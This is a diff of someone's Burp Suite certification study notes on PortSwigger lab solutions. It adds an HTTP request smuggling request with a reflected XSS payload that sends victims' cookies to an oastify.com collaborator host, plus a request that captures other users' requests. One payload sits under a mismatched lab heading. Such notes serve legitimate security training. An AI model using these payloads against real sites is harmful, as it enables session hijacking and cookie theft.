@@ -34,9 +34,7 @@ BSCP NOTES PREPAPATION
 
 * **PortSwigger Lab: Password reset poisoning via middleware**
 
-* **PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests**
-  📝 Комментарии + корректная работа с `Content-Length`
-  (см. notes)
+* **Lab: Exploiting HTTP request smuggling to deliver reflected XSS**
 ```html  
 POST / HTTP/1.1
 Host: 0ab900800495c1fc85f60e850077000a.web-security-academy.net
@@ -54,7 +52,23 @@ Cookie: session=qEApwbqQoQV5bqG8LQrnAvl3VQggWnaX
 csrf=Vwd8rkZxtPiqYWlzRk6hzpAPXyXMqEpY&postId=8&name=c&email=c%40c.c&website=&comment=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddccccccccc
 ```
 ---
+* **PortSwigger Lab: Password reset poisoning via middleware**
+```html
+POST / HTTP/1.1
+Host: 0aaa00e1044cbd8e82bb5621004a006c.web-security-academy.net
+Content-Length: 237
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
 
+0
+
+GET /post?postId=4 HTTP/1.1
+User-Agent: a"/><script>document.location='http://299n9jhwugy7941yfk1rcdmqdhj87zvo.oastify.com/?Hack='+document.cookie;</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
 ## 💉 XSS → Cookie Exfiltration (Classic Payload)
 
 ```html
@@ -160,12 +174,4 @@ java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAM
 > Stage 1 = session hijack → escalation → win.
 
 ---
-
-Если хочешь, старина — могу:
-
-* 🔥 сократить это под **1-страничный BSCP cheat sheet**
-* 🔥 оформить под **Notion / Obsidian**
-* 🔥 адаптировать конкретно под **реальный BSCP экзамен**
-
-Просто скажи 👊
 
